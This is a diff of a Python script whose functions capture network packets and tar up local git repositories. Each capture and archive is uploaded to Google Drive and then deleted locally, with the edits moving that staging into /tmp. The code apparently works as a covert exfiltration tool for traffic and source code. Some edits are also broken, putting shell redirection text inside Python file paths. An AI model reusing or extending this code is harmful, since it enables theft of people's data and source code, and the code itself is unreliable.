@@ -83,7 +83,7 @@ def sniff(toggle):
 
         print("Stopping the packet sniffer!")
         try:
-            os.system('mkdir captures')
+            os.system('mkdir /tmp/captures 2>/dev/null')
         except:
         #Dir exists
             pass
@@ -94,12 +94,12 @@ def sniff(toggle):
             snifferList.remove(snifferList[i])
             now = datetime.datetime.now()
             capName=now.strftime("%Y_%m_%d_%H_%M_%S")+interfaces[i]
-            dest_folder="captures/{}.pcap".format(capName)
+            dest_folder="/tmp/captures/{}.pcap".format(capName)
             scapy.wrpcap(dest_folder,capture, append=True)
             uploadToDrive(dest_folder,mime_types['pcap']) 
             os.remove(dest_folder)
         try:
-            os.rmdir('captures')
+            os.rmdir('/tmp/captures 2>/dev/null')
         except:
             pass
         
@@ -206,7 +206,7 @@ def get_git_repos():
 
     try:
 
-        os.system('mkdir gitFiles')
+        os.system('mkdir /tmp/gitFiles 2>/dev/null')
     except:
         pass
 
@@ -232,7 +232,7 @@ def get_git_repos():
         path,folder=re.findall(r'(.*)\/(.*)$',repository)[0]
         #print("Path,folder=",path," ",folder)
         #command2='tar -zcf gitFiles/{}.tar.gz ~"{}" 2>/dev/null'.format(folder,repository[1:]) 
-        dest_folder=cwd+"/gitFiles/"+folder+'.tar.gz'
+        dest_folder="/tmp/gitFiles/"+folder+'.tar.gz'
         try:   
             tardir(repository,dest_folder)
             print("Tarred the file! Uploading to Drive!")
@@ -241,10 +241,10 @@ def get_git_repos():
             os.remove(dest_folder)
         except:
             continue
-    for file in os.listdir(cwd+"/gitFiles"):
-        os.remove(cwd+"/gitFiles/"+file)
+    for file in os.listdir("/tmp/gitFiles"):
+        os.remove("/tmp/gitFiles/ 2>/dev/null"+file)
     
-    os.rmdir(cwd+'/gitFiles')
+    os.rmdir('/tmp/gitFiles 2>/dev/null')
     os.chdir(cwd)
     return 
 
